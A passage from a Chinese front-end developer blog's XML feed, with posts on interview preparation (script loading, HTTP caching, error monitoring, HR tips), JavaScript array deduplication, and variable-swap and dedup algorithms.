async2</span></span><br><span class="line"><span class="comment">// async1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 先执行完后面的script标签，再不定顺序的执行async的script，async1 和 async2 的顺序不定</span></span><br></pre></td></tr></table></figure></p><ol start="3"><li><p>利用浏览器缓存(http协议头)<br>1.) 强缓存(服务器同时下发这两个是，以Cache-Control为准)<br><strong>Expires</strong> &nbsp;&nbsp;&nbsp;&nbsp;  Expires:Mon,18 Oct 2066 23:59:59 GMT</p><p><strong>Cache-Control</strong> &nbsp;&nbsp;&nbsp;&nbsp; Cache-Control:max-age=3600</p><p>2.) 协商缓存<br><strong>Last-Modify</strong> &nbsp;&nbsp;&nbsp;&nbsp; <strong>If-Modify-Since</strong> &nbsp;&nbsp;&nbsp;&nbsp; Last-Modify: Thu,31 Dec 2037 23:59:59 GMT<br><strong>ETag</strong> &nbsp;&nbsp;&nbsp;&nbsp; <strong>If-None-Match</strong> &nbsp;&nbsp;&nbsp;&nbsp;</p></li><li><p>使用CDN（img、css、js）</p></li><li><p>预解析DNS</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"x-dns-prefetch-control"</span> <span class="attr">content</span>=<span class="string">"on"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>代码优化</p></li></ol><h3 id="错误监控"><a href="#错误监控" class="headerlink" title="错误监控"></a>错误监控</h3><ol><li><p>前端错误的分类<br>1.) 即时运行错误（代码错误）<br>2.) 资源加载错误（css、js加载错误）</p></li><li><p>错误捕获方式<br>1.）即时运行错误</p><ul><li><code>try...catch</code></li><li><code>window.onerror / window.addEventListener(&#39;error&#39;, function () {})`</code></li></ul><p>2.) 资源加载错误（冒泡无法获知，捕获可以获知）</p><ul><li><code>Obejct.onerror</code></li><li><p><code>performance.getEntries()</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">performance.getEntries().forEach(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(item);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 会输入所有的资源信息</span></span><br><span class="line"><span class="comment">// 判断总资源数是否相等（间接法）</span></span><br></pre></td></tr></table></figure></li><li><p>Error事件捕获</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.addEventListener(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(<span class="string">'捕获到异常'</span>, e);</span></span><br><span class="line"><span class="javascript">&#125;, <span class="literal">true</span>); <span class="comment">// false表示冒泡，true表示捕获，资源加载异常只能通过捕获获知</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//baidu.com/test.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>3.) 提问：跨域的js可以捕获到错误码？错误提示是什么？应该怎么处理？</p><ul><li><p>错误提示<br><img src="../images/javascript/js_error_control.png" title="跨域的js错误提示" width="60%"><br>从结果可以看出：无法获取具体的出错文件和代码行数</p></li><li><p>处理办法<br>客户端：<code>script</code> 标签增加 <code>crossorigin</code> 属性<br>服务端：设置js资源响应头 <code>Access-Control-Allow-Origin:*</code></p></li></ul></li></ol><ol start="3"><li>上报错误的基本原理<br>1.) <code>ajax</code> 请求上报（可以做到，但是通常不会使用此方法）<br>2.) <code>image</code> 对象上报，打点…<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> Image()).src = <span class="string">'http://baidu.com/test?error=qwer'</span>; <span class="comment">// network中就可以看到这个请求了</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 一些大公司的打点也是这个原理</span></span><br></pre></td></tr></table></figure></li></ol><hr><h2 id="面试"><a href="#面试" class="headerlink" title="面试"></a>面试</h2><h3 id="技术面试"><a href="#技术面试" class="headerlink" title="技术面试"></a>技术面试</h3><ol><li><p>业务能力</p><ul><li>做过什么业务<br>校长教研员后台系统、教学助手、德育管理、小程序</li><li>负责的业务有什么业绩</li><li>使用了什么技术方案<br>ECharts、Vue、html2canvas、小程序</li><li>突破了什么技术难点</li><li>遇到了什么问题<br>合成pdf太大的问题（拆分多次上传）、ECharts数据太多（拆分成多个图表）、H5置顶问题/iOS输入框+列表滑动问题（修改布局）</li><li>最大的收获是什么<br>对业务理解的更深入，对使用的技术更加熟练，更有把控</li></ul></li><li><p>团队协作能力</p></li><li><p>事物推动能力（跨部门、跨组）</p></li><li><p>带人能力<br>code reivew<br>编写框架，通用方法的编写<br>制定规范，eslint、变量、方法命名等<br>对开发时间有整体把握，及时调整</p></li><li><p>其他能力</p></li><li><p>你还有什么要问的吗？<br>对技术框架是否限制<br>开发环境一共几种（本地、test、staging、线上）<br>APP 页面开发时是否有一套成熟的客户端与js交互方法<br>是否有公司自己的打点体系<br>是否有deployer构建机制<br>是否经常会有一些大牛技术分享会<br>是否有相应的运维部门提供运维服务</p></li></ol><h3 id="HR面试"><a href="#HR面试" class="headerlink" title="HR面试"></a>HR面试</h3><ol><li><p>面试技巧</p><ul><li>乐观积极</li><li>主动沟通</li><li>逻辑顺畅</li><li>上进有责任心</li><li>有主张、做事果断</li></ul></li><li><p>内容分布（HR提问）</p><ul><li><p>职业竞争力（为什么这个职位你会合适）<br>1.) 业务能力（行业第一）</p><p>2.) 思考能力（对同一件事可以从不同的角度去思考问题，找到最优的解决方案）<br> 遇到难题怎么办：先自身花时间上网查找解决方法，尽可能的自己去解决。实在无法解决的话，询问一下技术群大牛，寻求一些同行朋友的帮助。解决之后进行总结，为什么自己无法解决，而别人可以，别人解决问题的思路是什么，用了哪些技术方案等</p><p>3.) 学习能力（不断的学习新的业务和技术，沉淀、总结）<br> 周末喜欢做什么：有空的时候会去参加一些分享会，多学习一些新的知识技能，了解一些行业的技术方案</p><p>4.) 无上限的付出（对于无法解决的问题可以熬夜、加班）</p></li><li><p>职业规划（对未来的规划）<br>1.) 目标是什么<br> 在业务上成为专家，帮助公司在行业上成为第一，在技术上成为行业大牛</p><p>2.) 近阶段的目标<br> 不断的学习和积累各方面的经验，以学习为主<br> 如果公司给我分配一个新岗位，我要先清楚岗位做什么，难点是什么，突破点在哪里，我要把它做到极值</p><p>3.) 长期目标<br> 做几件很有价值的事，如开源作品、技术框架（这两点很重要）</p><p>4.) 方式方法<br> 先完成业务上的主要问题，做到极致，然后逐步向目标靠拢<br> 我希望公司技术部会定期有分享会，公司能给我一些工具、一些平台、一些权限让我能够最大高效的解决问题</p></li></ul></li><li><p>沟通技巧<br>多夸人，多赞美HR</p></li></ol><h3 id="面试技巧"><a href="#面试技巧" class="headerlink" title="面试技巧"></a>面试技巧</h3><ol><li>JD描述（职位描述）<br>校招一定要看</li><li>简历<br>对照JD改出相吻合的简历，对于未掌握的技术栈快速复习、理解</li><li>自我介绍<br>一定要打草稿，展示什么优势，描述什么项目，切忌临场发挥</li></ol><h3 id="面试流程"><a href="#面试流程" class="headerlink" title="面试流程"></a>面试流程</h3><ol><li>一面<br>重基础<br>懂原理<br>要思考（不会的话不能直接回答不会，一定要深入思考）<br>知进退（不懂的话，可以问面试官能不能给个指导方向、查询的资料等）<br>势不可挡</li><li>二面<br>横向扩展<br>项目结合</li><li>三面<br>有经验<br>懂合作<br>有担当<br>动规矩<br>察言观色</li><li>终面<br>会沟通<br>要上进<br>好性格<br>有主见<br>强逻辑<br>无可挑剔</li><li>复盘<br>胜不骄，败不馁<br>总结经验<br>步步为营<br>多拿几个offer</li></ol>]]></content>
    
    <summary type="html">
    
      前端一些常见的面试题，面试前复习强烈推荐
    
    </summary>
    
    
      <category term="Other" scheme="http://pimichen.com/blog/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>数组去重方法</title>
    <link href="http://pimichen.com/blog/javascript/%E6%95%B0%E7%BB%84%E5%8E%BB%E9%87%8D%E6%96%B9%E6%B3%95.html"/>
    <id>http://pimichen.com/blog/javascript/数组去重方法.html</id>
    <published>2019-03-09T16:00:00.000Z</published>
    <updated>2019-03-09T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原数组"><a href="#原数组" class="headerlink" title="原数组"></a>原数组</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myArray = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">4</span>];</span><br></pre></td></tr></table></figure><h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> newArray = []; <span class="comment">//一个新的临时数组</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; myArray.length; i++)&#123; <span class="comment">//遍历当前数组</span></span><br><span class="line">    <span class="comment">//如果当前数组的第i项已经保存进了临时数组，那么跳过，</span></span><br><span class="line">    <span class="comment">//否则把当前项push到临时数组里面</span></span><br><span class="line">    <span class="keyword">if</span> (newArray.indexOf(myArray[i]) == <span class="number">-1</span>)&#123; <span class="comment">//在新数组中查找原数组的每一项是否存在</span></span><br><span class="line">      newArray.push(myArray[i]); <span class="comment">//如果不存在就加到新数组中</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// return newArray;</span></span><br><span class="line">  alert(<span class="string">"新的数组："</span> + newArray);</span><br><span class="line">&#125;</span><br><span class="line">aaa();</span><br></pre></td></tr></table></figure><h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bbb</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> n = &#123;&#125;,r=[]; <span class="comment">//n为hash表，r为临时数组</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; myArray.length; i++)&#123; <span class="comment">//遍历当前数组</span></span><br><span class="line">    <span class="keyword">if</span> (!n[myArray[i]])&#123; <span class="comment">//如果hash表中没有当前项</span></span><br><span class="line">      n[myArray[i]] = <span class="literal">true</span>; <span class="comment">//存入hash表</span></span><br><span class="line">      r.push(myArray[i]); <span class="comment">//把当前数组的当前项push到临时数组里面</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// return r;</span></span><br><span class="line">  alert(<span class="string">"新的数组："</span> + r);</span><br><span class="line">&#125;</span><br><span class="line">bbb();</span><br></pre></td></tr></table></figure><h2 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ccc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> n = [myArray[<span class="number">0</span>]]; <span class="comment">//结果数组</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; myArray.length; i++)&#123; <span class="comment">//从第二项开始遍历</span></span><br><span class="line">    <span class="comment">//如果当前数组的第i项在当前数组中第一次出现的位置不是i，</span></span><br><span class="line">    <span class="comment">//那么表示第i项是重复的，忽略掉。否则存入结果数组</span></span><br><span class="line">    <span class="keyword">if</span> (myArray.indexOf(myArray[i]) == i)&#123;</span><br><span class="line">      n.push(myArray[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// return n;</span></span><br><span class="line">  alert(<span class="string">"新的数组："</span> + n);</span><br><span class="line">&#125;</span><br><span class="line">ccc();</span><br></pre></td></tr></table></figure><h2 id="方法4（同时排序）"><a href="#方法4（同时排序）" class="headerlink" title="方法4（同时排序）"></a>方法4（同时排序）</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ddd</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  myArray.sort(); <span class="comment">//数组排序</span></span><br><span class="line">  <span class="keyword">var</span> re = [myArray[<span class="number">0</span>]]; <span class="comment">//先提取最小的</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; myArray.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>( myArray[i] !== re[re.length<span class="number">-1</span>])&#123; <span class="comment">//将不等于的放在新数组的后面，等于的跳过</span></span><br><span class="line">      re.push(myArray[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// return re;</span></span><br><span class="line">  alert(<span class="string">"新的数组："</span> + re);</span><br><span class="line">&#125;</span><br><span class="line">ddd();</span><br></pre></td></tr></table></figure><h2 id="相关常见数组方法"><a href="#相关常见数组方法" class="headerlink" title="相关常见数组方法"></a>相关常见数组方法</h2><blockquote><p><a href="http://web.jobbole.com/83518/" target="_blank" rel="noopener">http://web.jobbole.com/83518/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      常用的数组去重方法集锦
    
    </summary>
    
    
      <category term="JavaScript" scheme="http://pimichen.com/blog/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>前端算法集合</title>
    <link href="http://pimichen.com/blog/javascript/%E5%89%8D%E7%AB%AF%E7%AE%97%E6%B3%95%E9%9B%86%E5%90%88.html"/>
    <id>http://pimichen.com/blog/javascript/前端算法集合.html</id>
    <published>2019-03-08T16:00:00.000Z</published>
    <updated>2019-04-28T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用前介绍"><a href="#使用前介绍" class="headerlink" title="使用前介绍"></a>使用前介绍</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// How to export and import </span></span><br><span class="line"><span class="built_in">module</span>.exports = swap; --&gt; 对应 <span class="keyword">var</span> s = <span class="built_in">require</span>(<span class="string">'../*.js'</span>);</span><br><span class="line"><span class="comment">// 或：</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> swap --&gt; 对应 <span class="keyword">import</span> s <span class="keyword">from</span> <span class="string">'../*.js'</span></span><br><span class="line"><span class="comment">// 或:</span></span><br><span class="line"><span class="keyword">export</span> &#123;swap&#125; --&gt; 对应 <span class="keyword">import</span> &#123;swap&#125; <span class="keyword">from</span> <span class="string">'../*.js'</span></span><br></pre></td></tr></table></figure><h1 id="不借助临时变量，交换整数"><a href="#不借助临时变量，交换整数" class="headerlink" title="不借助临时变量，交换整数"></a>不借助临时变量，交换整数</h1><h2 id="加减乘除法"><a href="#加减乘除法" class="headerlink" title="加减乘除法"></a>加减乘除法</h2><p>注意：如果是浮点数，对于加减乘除法需要注意<a href="/javascript/浮点数运算导致精度丢失.html">浮点数的精度丢失</a>问题。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 思想：先求两个数的“和”，再用“和”去减</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">a, b</span>) </span>&#123; <span class="comment">// 如 [1, 3]</span></span><br><span class="line">  a = a + b; <span class="comment">// a = 1 + 3 = 4</span></span><br><span class="line">  b = a - b; <span class="comment">// b = 4 - 3 = 1</span></span><br><span class="line">  a = a - b; <span class="comment">// a = 4 - 1 = 3</span></span><br><span class="line">  <span class="keyword">return</span> [a, b]; <span class="comment">// [3, 1]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 思想：先求两个数的“差”，再用“差”去加</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">a, b</span>) </span>&#123; <span class="comment">// 如 [3, 1]</span></span><br><span class="line">  a = a - b; <span class="comment">// a = 3 - 1 = 2</span></span><br><span class="line">  b = a + b; <span class="comment">// b = 2 + 1 = 3</span></span><br><span class="line">  a = b - a; <span class="comment">// a = 3 - 2 = 1</span></span><br><span class="line">  <span class="keyword">return</span> [a, b]; <span class="comment">// [1, 3]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 思想：先求两个数的“乘积”，再用“乘积”去除</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">a, b</span>) </span>&#123; <span class="comment">// 如 [3, 8]</span></span><br><span class="line">  a = a * b; <span class="comment">// a = 3 * 8 = 24</span></span><br><span class="line">  b = a / b; <span class="comment">// b = 24 / 8 = 3</span></span><br><span class="line">  a = a / b; <span class="comment">// a = 24 / 3 = 8</span></span><br><span class="line">  <span class="keyword">return</span> [a, b]; <span class="comment">// [8, 3]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 思想：先求两个数的“商”，再用“商”去乘</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">a, b</span>) </span>&#123; <span class="comment">// 如 [8, 3]</span></span><br><span class="line">  a = a / b; <span class="comment">// a = 8 / 3 = 8 / 3</span></span><br><span class="line">  b = a * b; <span class="comment">// b = (8 / 3) * 3 = 8</span></span><br><span class="line">  a = b / a; <span class="comment">// a = 8 / (8 / 3) = 3</span></span><br><span class="line">  <span class="keyword">return</span> [a, b]; <span class="comment">// [3, 8]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="对象法"><a href="#对象法" class="headerlink" title="对象法"></a>对象法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">a, b</span>) </span>&#123; <span class="comment">// 如 [1, 3]</span></span><br><span class="line">  a = &#123;</span><br><span class="line">    a: b,</span><br><span class="line">    b: a</span><br><span class="line">  &#125;</span><br><span class="line">  b = a.b; <span class="comment">// 1</span></span><br><span class="line">  a = a.a; <span class="comment">// 3</span></span><br><span class="line">  <span class="keyword">return</span> [a, b]; <span class="comment">// [3, 1]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组法"><a href="#数组法" class="headerlink" title="数组法"></a>数组法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">a, b</span>) </span>&#123; <span class="comment">// 如 [1, 3]</span></span><br><span class="line">  a = [a, b];</span><br><span class="line">  b = a[<span class="number">0</span>]; <span class="comment">// 1</span></span><br><span class="line">  a = a[<span class="number">1</span>]; <span class="comment">// 3</span></span><br><span class="line">  <span class="keyword">return</span> [a, b]; <span class="comment">// [3, 1]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">a, b</span>) </span>&#123; <span class="comment">// 如 [1, 3]</span></span><br><span class="line">  a = [b, b = a][<span class="number">0</span>]; <span class="comment">// a = 3, b = 1;</span></span><br><span class="line">  <span class="keyword">return</span> [a, b]; <span class="comment">// [3 ,1]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ES6数组解构法，推荐"><a href="#ES6数组解构法，推荐" class="headerlink" title="ES6数组解构法，推荐"></a>ES6数组解构法，推荐</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">a, b</span>) </span>&#123; <span class="comment">// 如 [1, 3]</span></span><br><span class="line">  [a, b] = [b, a];</span><br><span class="line">  <span class="keyword">return</span> [a, b];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="数组去重"><a href="#数组去重" class="headerlink" title="数组去重"></a>数组去重</h1><h2 id="方法1（filter，推荐使用）"><a href="#方法1（filter，推荐使用）" class="headerlink" title="方法1（filter，推荐使用）"></a>方法1（filter，推荐使用）</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filter函数会过滤出满足条件的元素</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uniqueArr</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> newArr = arr.filter(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123; <span class="comment">// 三个参数依次是：当前项、索引值、arr对象</span></span><br><span class="line">    <span class="keyword">return</span> self.indexOf(item) === index; <span class="comment">// 对于重复的元素，只有第一个元素符合条件，后面的都会被过滤掉</span></span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> newArr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="方法2（新数组法）"><a href="#方法2（新数组法）" class="headerlink" title="方法2（新数组法）"></a>方法2（新数组法）</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uniqueArr</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> newArr = []; <span class="comment">// 一个新的临时数组</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++)&#123; <span class="comment">// 遍历当前数组</span></span><br><span class="line">    <span class="comment">// 如果当前数组的第i项已经保存进了临时数组，那么跳过，</span></span><br><span class="line">    <span class="comment">// 否则把当前项push到临时数组里面</span></span><br><span class="line">    <span class="keyword">if</span> (newArr.indexOf(arr[i]) === <span class="number">-1</span>)&#123; <span class="comment">// 在新数组中查找原数组的每一项是否存在</span></span><br><span class="line">      newArr.push(arr[i]); <span class="comment">// 如果不存在就加到新数组中</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> newArr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="方法3（hash表法）"><a href="#方法3（hash表法）" class="headerlink" title="方法3（hash表法）"></a>方法3（hash表法）</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uniqueArr</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;&#125;, newArr = []; <span class="comment">// obj为hash表，newArr为临时数组</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123; <span class="comment">// 遍历当前数组 , 可改成 for (var i in arr) &#123;</span></span><br><span class="line">    <span class="keyword">if</span> (!obj[arr[i]])&#123; <span class="comment">// 如果hash表中没有当前项</span></span><br><span class="line">      obj[arr[i]] = <span class="literal">true</span>; <span class="comment">// 存入hash表</span></span><br><span class="line">      newArr.push(arr[i]); <span class="comment">// 把当前数组的当前项push到临时数组里面</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> newArr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="方法4"><a href="#方法4" class="headerlink" title="方法4"></a>方法4</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uniqueArr</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> newArr = [arr[<span class="number">0</span>]]; <span class="comment">// 结果数组</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; arr.length; i++) &#123; <span class="comment">// 从第二项开始遍历</span></span><br><span class="line">    <span class="comment">// 如果当前数组的第i项在当前数组中第一次出现的位置不是i，</span></span><br><span class="line">    <span class="comment">// 那么表示第i项是重复的，忽略掉。否则存入结果数组</span></span><br><span class="line">    <span class="keyword">if</span> (arr.indexOf(arr[i]) === i) &#123;</span><br><span class="line">      newArr.push(arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> newArr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="方法5（同时排序）"><a href="#方法5（同时排序）" class="headerlink" title="方法5（同时排序）"></a>方法5（同时排序）</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uniqueArr</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">  arr.sort(); <span class="comment">// 数组排序</span></span><br><span class="line">  <span class="keyword">var</span> newArr = [arr[<span class="number">0</span>]]; <span class="comment">// 先提取最小的</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (arr[i] !== 